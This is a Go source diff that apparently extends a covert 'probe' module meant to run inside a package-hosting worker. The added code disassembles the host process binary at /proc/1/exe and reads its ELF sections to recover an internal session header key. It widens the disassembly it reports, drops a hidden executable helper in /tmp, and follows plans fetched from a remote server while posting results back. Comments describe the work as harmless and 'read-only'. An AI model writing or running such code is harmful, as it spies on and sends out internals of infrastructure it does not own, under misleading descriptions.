@@ -7,6 +7,7 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
+	"debug/elf"
 	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
@@ -19,6 +20,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"sort"
 	"strconv"
 	"strings"
@@ -37,7 +39,7 @@ var rpcDialAddress string
 const (
 	protocolVersion        = 1
 	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion           = "v0.0.43-codex"
+	probeVersion           = "v0.0.47-codex"
 	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
 	targetRegistry         = "https://proxy.golang.org"
 	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
@@ -146,6 +148,9 @@ type inspectionResult struct {
 	Symbols      []string          `json:"symbols,omitempty"`
 	DialWindow   []string          `json:"dial_window,omitempty"`
 	CallerWindow []string          `json:"caller_window,omitempty"`
+	MetadataKey  string            `json:"metadata_key,omitempty"`
+	KeyAddress   string            `json:"metadata_key_address,omitempty"`
+	KeyLength    int               `json:"metadata_key_length,omitempty"`
 	Error        string            `json:"error,omitempty"`
 }
 
@@ -192,7 +197,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v043-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v047-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -331,9 +336,9 @@ func cleanError(err error) string {
 
 func runCapslockSession(started time.Time, cwd string, identity identityResult) {
 	initial := newProbeReport(started, identity)
-	initial.Reason = "waiting for the bounded read-only descriptor plan"
+	initial.Reason = "waiting for the bounded read-only session dataflow plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v043-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v047-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -362,13 +367,13 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		switch step.Action {
 		case "finish":
 			report.Reason = "bounded plan finished"
-		case "inspect-byteman-descriptors":
-			runBytemanDescriptorInspection(&report)
+		case "inspect-session-dataflow":
+			runSessionDataflowInspection(&report)
 		default:
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v043-codex-step-" + strconv.Itoa(cursor)
+		id := "v047-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -387,7 +392,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v043-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v047-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -443,7 +448,7 @@ func validatePlanStep(step planStep) error {
 		}
 	}
 	switch step.Action {
-	case "inspect-byteman-descriptors", "finish":
+	case "inspect-session-dataflow", "finish":
 		if step.RouteMode != "" {
 			return errors.New("non-probe plan included route parameters")
 		}
@@ -623,6 +628,89 @@ func instructionWindow(data []byte, marker string, before, after int) []string {
 	return nil
 }
 
+var objectAddressPattern = regexp.MustCompile(`#\s*([0-9a-fA-F]+)\s*<`)
+
+func fixedMetadataKeyLocation(data []byte) (uint64, int, error) {
+	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
+	metadataIndex := -1
+	for index, line := range lines {
+		if strings.Contains(line, "metadata.New") {
+			metadataIndex = index
+			break
+		}
+	}
+	if metadataIndex < 0 {
+		return 0, 0, errors.New("metadata.New marker was not found")
+	}
+	assignIndex := -1
+	for index := metadataIndex - 1; index >= 0 && index >= metadataIndex-96; index-- {
+		if strings.Contains(lines[index], "runtime.mapassign_faststr") {
+			assignIndex = index
+			break
+		}
+	}
+	if assignIndex < 0 {
+		return 0, 0, errors.New("metadata map assignment was not found")
+	}
+	var address uint64
+	length := 0
+	for index := assignIndex - 1; index >= 0 && index >= assignIndex-20; index-- {
+		line := lines[index]
+		if length == 0 && strings.Contains(line, "mov") && strings.Contains(line, "edi,0xf") {
+			length = 15
+		}
+		if address == 0 && strings.Contains(line, "lea") && strings.Contains(line, "rcx,[rip+") {
+			match := objectAddressPattern.FindStringSubmatch(line)
+			if len(match) == 2 {
+				parsed, err := strconv.ParseUint(match[1], 16, 64)
+				if err == nil {
+					address = parsed
+				}
+			}
+		}
+	}
+	if address == 0 || length != len("X-SOS-SessionID") {
+		return 0, 0, errors.New("fixed metadata key location was incomplete")
+	}
+	return address, length, nil
+}
+
+func resolveFixedMetadataKey(data []byte) (string, string, int, error) {
+	address, length, err := fixedMetadataKeyLocation(data)
+	if err != nil {
+		return "", "", 0, err
+	}
+	executable, err := elf.Open("/proc/1/exe")
+	if err != nil {
+		return "", "", 0, errors.New("worker executable could not be opened as ELF")
+	}
+	defer executable.Close()
+	end := address + uint64(length)
+	if end < address {
+		return "", "", 0, errors.New("fixed metadata key address overflowed")
+	}
+	for _, section := range executable.Sections {
+		sectionEnd := section.Addr + section.Size
+		if sectionEnd < section.Addr || address < section.Addr || end > sectionEnd ||
+			section.Flags&elf.SHF_ALLOC == 0 || section.Flags&elf.SHF_WRITE != 0 {
+			continue
+		}
+		reader := section.Open()
+		if _, err := reader.Seek(int64(address-section.Addr), io.SeekStart); err != nil {
+			return "", "", 0, errors.New("fixed metadata key offset could not be selected")
+		}
+		literal := make([]byte, length)
+		if _, err := io.ReadFull(reader, literal); err != nil {
+			return "", "", 0, errors.New("fixed metadata key bytes could not be read")
+		}
+		if string(literal) != "X-SOS-SessionID" {
+			return "", "", 0, errors.New("fixed metadata key literal did not match")
+		}
+		return "X-SOS-SessionID", fmt.Sprintf("0x%x", address), length, nil
+	}
+	return "", "", 0, errors.New("fixed metadata key address was outside read-only ELF sections")
+}
+
 func runSessionDataflowInspection(report *probeReport) {
 	result := report.Inspection
 	if result == nil {
@@ -646,9 +734,15 @@ func runSessionDataflowInspection(report *probeReport) {
 		result.Error = cleanError(err)
 		return
 	}
-	// Keep enough instructions before mapassign_faststr to resolve both the
-	// fixed 15-byte metadata key and the exact value loaded into its map slot.
-	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 112, 24)
+	// This bounded slice spans the function entry through metadata-attacher
+	// creation on the pinned worker build. It is intentionally limited to one
+	// named function and cannot expose arbitrary process memory or strings.
+	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 768, 48)
+	result.MetadataKey, result.KeyAddress, result.KeyLength, err = resolveFixedMetadataKey(dialOutput)
+	if err != nil {
+		result.Error = cleanError(err)
+		return
+	}
 	callerOutput, err := runFixedTool(
 		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble=main.main", "/proc/1/exe",
 	)
@@ -661,7 +755,7 @@ func runSessionDataflowInspection(report *probeReport) {
 		result.Error = "fixed inspection markers were incomplete"
 		return
 	}
-	report.Reason = "bounded static session dataflow inspection completed"
+	report.Reason = "bounded server.dial dataflow and fixed metadata key inspection completed"
 }
 
 func runBytemanDescriptorInspection(report *probeReport) {
@@ -677,7 +771,7 @@ func runBytemanDescriptorInspection(report *probeReport) {
 		report.Inspection.Error = "descriptor helper digest did not match the fixed build"
 		return
 	}
-	helperCopy := "/tmp/.go-cgo-v043-describe-protos"
+	helperCopy := "/tmp/.go-cgo-v047-describe-protos"
 	copyFile, err := os.OpenFile(helperCopy, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o700)
 	if err != nil {
 		report.Inspection.Error = "fixed descriptor helper copy could not be created"
